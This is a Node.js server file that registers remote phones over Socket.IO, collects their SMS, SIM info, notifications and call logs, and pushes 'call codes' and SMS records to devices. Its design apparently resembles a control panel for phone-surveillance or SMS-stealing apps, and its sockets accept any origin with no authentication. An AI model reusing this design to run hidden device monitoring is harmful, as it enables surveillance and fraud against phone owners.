import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// Routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

// Make IO available inside controllers
app.set("io", io);

app.use(cors());
app.use(express.json());

const deviceSockets = new Map();


// ----------------------------------------------------------------
// 🔥 SOCKET HANDLERS
// ----------------------------------------------------------------
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);

  let currentDeviceId = null;

  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    if (deviceSockets.has(uniqueid)) {
      const oldSocketId = deviceSockets.get(uniqueid);
      if (io.sockets.sockets.get(oldSocketId)) {
        io.sockets.sockets.get(oldSocketId).disconnect(true);
        console.log(`♻️ Old socket for ${uniqueid} disconnected`);
      }
      deviceSockets.delete(uniqueid);
    }

    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);

    console.log(`📱 Registered Device: ${uniqueid}`);
    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });
    io.emit("deviceListUpdated", { event: "device_connected", uniqueid });
  });

  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);

    io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
    io.emit("deviceListUpdated", { event: "status_changed", uniqueid, connectivity });
  });

  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentDeviceId) {
      setTimeout(() => {
        const stillConnected = [...deviceSockets.values()].includes(socket.id);

        if (!stillConnected) {
          deviceSockets.delete(currentDeviceId);

          io.emit("deviceStatus", {
            uniqueid: currentDeviceId,
            connectivity: "Offline",
            updatedAt: new Date(),
          });

          io.emit("deviceListUpdated", {
            event: "device_disconnected",
            uniqueid: currentDeviceId,
          });

          saveLastSeen(currentDeviceId, "Offline");
        }
      }, 5000);
    }
  });
});


// ----------------------------------------------------------------
// 🔹 Save Last Seen API Helper
// ----------------------------------------------------------------
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}


// ----------------------------------------------------------------
// 🔹 CallCode Emit
// ----------------------------------------------------------------
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueid}`);
  }
}


// ----------------------------------------------------------------
// 🔥 MONGODB CHANGE STREAMS
// ----------------------------------------------------------------
mongoose.connection.once("open", () => {
  console.log("📡 MongoDB connected — Watching Devices, SIMs, Calls, SMS, Admin...");

  try {
    // Devices
    const deviceStream = mongoose.connection.collection("devices").watch();
    deviceStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDevice = await mongoose.connection
        .collection("devices")
        .findOne({ _id: change.documentKey._id });

      if (updatedDevice) {
        console.log(`📡 Device Change → ${updatedDevice.uniqueId}`);
        io.emit("deviceListUpdated", { event: "db_change", device: updatedDevice });
      }
    });

    // SIM Info
    const simStream = mongoose.connection.collection("siminfos").watch();
    simStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedSim = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: change.documentKey._id });

      if (updatedSim) {
        io.emit("simInfoUpdated", {
          event: "sim_change",
          sim: updatedSim,
        });
      }
    });

    // CallCodes
    const callStream = mongoose.connection.collection("callcodes").watch();
    callStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: change.documentKey._id });

      if (updatedDoc) {
        sendCallCodeToDevice(updatedDoc.deviceId, updatedDoc);
      }
    });

    // SMS
    const smsStream = mongoose.connection.collection("sms").watch();
    smsStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("sms")
        .findOne({ _id: change.documentKey._id });

      if (updatedDoc) {
        const socketId = deviceSockets.get(updatedDoc.deviceId);
        if (socketId) io.to(socketId).emit("smsUpdate", updatedDoc);
      }
    });

    // ----------------------------------------------------------------
    // 🔥 ADMIN CHANGE STREAM (ADD THIS)
    // ----------------------------------------------------------------
    const adminStream = mongoose.connection.collection("adminnumbers").watch();
    adminStream.on("change", async (change) => {
      const updatedAdmin = await mongoose.connection
        .collection("adminnumbers")
        .findOne({ _id: change.documentKey._id });

      if (updatedAdmin) {
        console.log("👑 Admin Change Detected →", updatedAdmin);

        // LIVE EMIT
        io.emit("adminUpdate", {
          number: updatedAdmin.number,
          status: updatedAdmin.status,
        });
      }
    });
  } catch (err) {
    console.error("💥 Change stream init failed:", err);
  }
});


// ----------------------------------------------------------------
// ROUTES
// ----------------------------------------------------------------
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);


// ----------------------------------------------------------------
// ERROR HANDLERS
// ----------------------------------------------------------------
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);
app.use((err, req, res, next) => {
  console.error("💥 Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});


// ----------------------------------------------------------------
// SERVER START
// ----------------------------------------------------------------
const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`)
);
